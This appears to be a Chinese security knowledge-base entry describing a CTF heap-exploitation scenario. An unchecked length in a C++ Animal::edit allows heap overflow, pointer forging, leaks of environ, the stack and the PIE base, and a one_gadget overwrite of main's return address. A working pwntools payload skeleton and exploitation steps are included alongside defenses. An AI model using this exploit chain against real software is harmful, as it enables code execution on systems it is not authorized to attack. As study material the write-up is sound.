---
id: binary-pwn-heap-cpp-animal-edit-size-mismatch-environ-onegadget
title: C++ vector<deque<Animal>> 编辑长度不校验：堆溢出伪造相邻 Animal 内容指针，environ 泄露栈后改写 main 返回地址 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: cpp-animal-edit-size-mismatch-overflow
aliases:
- Animal::edit 堆溢出
- vector deque 堆题
- C++ 容器堆溢出
- environ 泄露栈
- one_gadget 返回地址
- 编辑长度不校验
tags:
- pwn
- heap-overflow
- cpp
- deque
- vector
- environ
- stack-leak
- one-gadget
- glibc-2.39
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T13:34:18+08:00'
  notes: 已对照原文近队礼仪的容器全文与图 10-12、24 核对：vector<deque<Animal>> 与 v2[2]、Animal::edit 不校验长度、0x90+0x20 溢出、environ/environ-0x30 泄露、ret_of_main=environ-0x130、0x101a 对齐、0xef52b one_gadget 均与 EXP 一致；图 12 显示交互 shell；未在本机复跑
---

## 一句话结论

C++ 菜单题用 `vector<deque<Animal>>` 管理对象，`Animal::edit()` 接受新长度却不校验它与原内容缓冲区大小是否一致，直接把用户输入写进旧缓冲区；攻击者因此可以溢出相邻 Animal 结构，伪造内容指针指向 `environ` 泄露栈地址、再指向 main 返回地址写入 one_gadget，退出菜单时拿到 shell。

## 原理

- **对象布局**：程序用 `vector<deque<Animal>>` 存动态对象，另有 `Animal* v2[2]` 静态数组；每个 Animal 对象约 0x18 字节，内部有一个指向内容缓冲区的指针，内容缓冲区按创建时的大小单独 `malloc`。
- **编辑接口缺陷**：`Animal::edit()` 在编辑时只按用户新输入的长度读取/拷贝数据，不检查新长度是否超过原内容缓冲区容量，也不重新分配；超过原长度的部分直接写到相邻堆块，形成堆溢出。
- **伪造相邻对象**：先创建两个内容大小为 0x90 的 Animal，再对第一个执行超长 edit，payload 用 0x90 字节填满原缓冲区，随后写入伪造的 chunk 头（如 `p64(0)+p64(0x21)`）和指向 `environ` 的指针，覆盖相邻 Animal 的内容指针/结构字段。
- **泄露栈与 PIE**：对第二个 Animal 执行 show，会从被篡改的内容指针读取；指向 `environ` 时泄露 libc 中的栈地址，指向 `environ-0x30` 时泄露栈上 `_start` 的返回地址，减去 `_start` 偏移即得 PIE 基址。
- **任意写与劫持返回地址**：再次 edit 第一个 Animal 把第二个 Animal 的内容指针改到 main 的返回地址，然后 edit 第二个 Animal（长度 8）写入 `ret` gadget 和 one_gadget 地址；选择退出菜单让 main 返回，触发 one_gadget。
- **one_gadget 约束**：样本选择 `execve("/bin/sh", rbp-0x50, [rbp-0x78])` 一类 gadget，要求 `rbp-0x50` 可写、`rax` 可控或为 NULL；执行前用一次 `ret` 做栈对齐。

## 触发条件

- 目标为 x86-64 C++ 程序，开启 Canary/PIE/NX 但仍存在堆溢出且能泄露地址。
- 菜单提供对 `v2` 静态数组 Animal 的创建/编辑/展示/删除（如选项 12/14/15/13）。
- 能创建至少两个 Animal，内容缓冲区相邻，且 edit 不校验新长度。
- 程序退出路径会正常返回 main，可覆盖 main 的返回地址。
- 需要 `environ` 符号可用（libc 已知）以及可用 one_gadget。

## 利用步骤

1. 创建两个 `v2` Animal，内容大小均为 0x90，使两个内容块在堆上相邻。
2. 对第一个 Animal 执行 edit，长度设为 0x90+0x20，payload：`b'a'*0x90 + p64(0) + p64(0x21) + p64(0) + p64(environ)`，覆盖相邻 Animal 的内容指针为 `environ`。
3. show 第二个 Animal，接收 6 字节并计算 libc 基址/栈地址（`environ` 的值）。
4. 再次 edit 第一个 Animal，把第二个 Animal 的内容指针改为 `environ_addr-0x30`；show 第二个 Animal，泄露栈上的 `_start` 返回地址，计算 PIE 基址。
5. 计算 main 返回地址（`environ_addr-0x130` 一类固定偏移）与 `ret` gadget；edit 第一个 Animal 把第二个 Animal 的内容指针指向该返回地址。
6. edit 第二个 Animal（长度 8）写入 `ret_addr`；再 edit 第一个 Animal 把指针移到返回地址+8，edit 第二个 Animal 写入 one_gadget。
7. 选择退出菜单，main 返回时执行 one_gadget；必要时在链前补 `ret` 满足对齐约束。

## PoC

关键 payload 骨架（地址/偏移按目标调整；原文 EXP 已打通并拿到 shell）：

```python
# 0x90 内容块溢出，伪造相邻 Animal 的内容指针为 environ
payload = b'a'*0x90 + p64(0) + p64(0x21) + p64(0) + p64(environ)
edit_animal_vector(0, 0x90+0x20, payload)

# show 第二个 Animal 泄露 environ（libc 栈地址）
show_animal_vector(1)
environ_addr = u64(p.recv(6).ljust(8, b'\x00'))

# 改指针到 environ-0x30，泄露 _start 返回地址 -> PIE
payload = b'a'*0x90 + p64(0) + p64(0x21) + p64(0) + p64(environ_addr-0x30)
edit_animal_vector(0, 0x90+0x20, payload)
show_animal_vector(1)
start_addr = u64(p.recv(6).ljust(8, b'\x00')) - 37

# 改写 main 返回地址
ret_of_main = environ_addr - 0x130
edit_animal_vector(0, 0x110, b'a'*0x90 + p64(0) + p64(0x21) + p64(0) + p64(ret_of_main))
edit_animal_vector(1, 8, p64(proc_base + 0x101a))       # ret 对齐
edit_animal_vector(0, 0x110, b'a'*0x90 + p64(0) + p64(0x21) + p64(0) + p64(ret_of_main+8))
edit_animal_vector(1, 8, p64(libc.address + 0xef52b))   # one_gadget
```

## 变体与关联

- 变体：`vector`/`deque` 的对象布局因编译器与标准库实现而异，需用 malloc 断点确认真实偏移；元素大小、控制块与内容块不一定相邻。
- 变体：把目标从 `environ` 改为 GOT、`__free_hook`、`_IO_list_all`，或用 unsorted bin 泄露 libc 后再打 FSOP。
- 变体：若 edit 会重新分配但错误地保留了旧指针，则形成 UAF 而非纯溢出，可结合 tcache 毒化。
- 关联：[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（environ 泄露栈 + 栈上 ROP）、[[binary-pwn-heap-pack-stale-cap-oob-note-struct-function-pointer]]（编辑长度/容量不同步导致越界）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（返回地址改写后的 ROP 衔接）。

## 检测与防御

- 防御：edit 前校验新长度不超过原缓冲区容量；优先使用 `std::string`/`std::vector` 的自动扩容而不是裸指针；开启 Canary、PIE、Full RELRO。
- 检测：监控同一内容块被反复以更大长度写入、相邻堆块头被改为小 size（0x21 等）以及 `environ` 附近被读取的行为。
- 分析：用 malloc/free 断点记录 Animal 对象与内容块的真实地址，先确认“对象—内容—相邻对象”的布局，再构造溢出；不要仅凭源码字段顺序猜偏移。
- 该场景为 CTF/授权测试利用，one_gadget 约束需按目标 libc 复核。
